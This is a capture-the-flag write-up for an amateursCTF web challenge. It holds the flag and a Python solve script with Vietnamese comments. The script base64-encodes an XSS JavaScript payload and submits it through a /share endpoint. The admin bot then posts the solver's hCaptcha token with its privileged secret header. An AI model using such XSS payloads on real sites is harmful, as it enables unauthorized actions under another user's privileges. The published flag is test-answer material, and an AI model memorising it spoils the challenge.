solver: lilsadfoqs - will commit full explaination real quick later :Đ

`amateursCTF{W_C4PTCH4_B3h4v13r}`

The main idea is to have the bot visit the site with your h-captcha-reponse (you can catch your browser request after submitting your done captcha puzzle)

![image](https://github.com/user-attachments/assets/dc3a478a-b2a1-48ed-9762-8996a553d41f)

![image](https://github.com/user-attachments/assets/ef830062-a419-41e1-a7fc-99ce490eeda8)


```python
import requests
import base64
import sys

# --- Cấu hình ---
# URL mục tiêu của challenge
TARGET_URL = "https://web-hcaptcha-rwc8edgt.amt.rs"
# URL mà bot sẽ truy cập bên trong container
BOT_INTERNAL_URL = "http://127.0.0.1:4071/"

def get_flag():
    """
    Tự động hóa chuỗi tấn công XSS để lấy flag.
    """
    print("--- Script tự động lấy flag CTF ---")

    # --- Bước 1: Lấy h-captcha-response từ người dùng ---
    print("\n[BƯỚC 1] Vui lòng thực hiện các bước sau:")
    print(f"  1. Mở trang web: {TARGET_URL}")
    print("  2. Mở Developer Tools (F12) -> Network.")
    print("  3. Giải captcha và nhấn Submit.")
    print("  4. Tìm request POST, vào tab Payload và copy giá trị của 'h-captcha-response'.")

    try:
        h_captcha_token = input("\n[INPUT] Dán giá trị 'h-captcha-response' vào đây: ").strip()
        if not h_captcha_token:
            print("[LỖI] Token không được để trống. Vui lòng thử lại.", file=sys.stderr)
            return
    except KeyboardInterrupt:
        print("\nĐã hủy.")
        return

    # --- Bước 2: Chuẩn bị XSS payload ---
    print("\n[BƯỚC 2] Đang chuẩn bị XSS payload...")

    # JavaScript payload này sẽ được bot thực thi.
    # Nó gửi một request POST đến chính server, mang theo token captcha của chúng ta.
    # Header X-secret sẽ được bot tự động đính kèm.
    js_payload = f"""
    fetch('{BOT_INTERNAL_URL}', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
        body: 'h-captcha-response={h_captcha_token}'
    }});
    """

    # Mã hóa payload sang Base64
    js_payload_bytes = js_payload.encode('utf-8')
    base64_payload = base64.b64encode(js_payload_bytes).decode('utf-8')
    print("  -> Payload đã được mã hóa Base64.")

    # --- Bước 3: Gửi yêu cầu đến /share để kích hoạt bot ---
    print("\n[BƯỚC 3] Đang yêu cầu bot thực thi XSS payload...")

    # URL cuối cùng mà bot sẽ truy cập
    bot_target_url = f"{BOT_INTERNAL_URL}?xss={base64_payload}"

    # Body của request gửi đến /share
    share_payload = {"url": bot_target_url}

    try:
        share_endpoint = f"{TARGET_URL}/share"
        response_share = requests.post(share_endpoint, json=share_payload, timeout=10)

        if response_share.status_code == 200 and "Sharing is caring!" in response_share.text:
            print("  -> Yêu cầu thành công! Bot đang xử lý...")
        else:
            print(f"[LỖI] Gửi yêu cầu đến /share thất bại. Status: {response_share.status_code}", file=sys.stderr)
            print(f"  -> Response: {response_share.text}", file=sys.stderr)
            return

    except requests.exceptions.RequestException as e:
        print(f"[LỖI] Lỗi mạng khi gửi yêu cầu đến /share: {e}", file=sys.stderr)
        return

    # --- Bước 4: Truy cập trang chính để lấy flag ---
    print("\n[BƯỚC 4] Đang lấy flag...")

    try:
        response_flag = requests.get(TARGET_URL, timeout=10)

        if response_flag.status_code != 200:
            print(f"[LỖI] Không thể truy cập trang chính. Status: {response_flag.status_code}", file=sys.stderr)
            return

        # Phân tích HTML để tìm flag
        html_content = response_flag.text
        start_tag = "<code>"
        end_tag = "</code>"

        start_index = html_content.find(start_tag)
        if start_index != -1:
            end_index = html_content.find(end_tag, start_index)
            if end_index != -1:
                flag = html_content[start_index + len(start_tag):end_index]
                print("\n" + "="*40)
                print(f"  FLAG: {flag}")
                print("="*40 + "\n")
            else:
                print("[KẾT QUẢ] Không tìm thấy flag trên trang. Có thể payload đã sai hoặc token hết hạn.", file=sys.stderr)
        else:
            print("[KẾT QUẢ] Không tìm thấy flag trên trang. Hãy kiểm tra lại các bước.", file=sys.stderr)

    except requests.exceptions.RequestException as e:
        print(f"[LỖI] Lỗi mạng khi lấy flag: {e}", file=sys.stderr)

if __name__ == "__main__":
    get_flag()
```

run the script, paste your h-captcha-reponse, get your flag :D
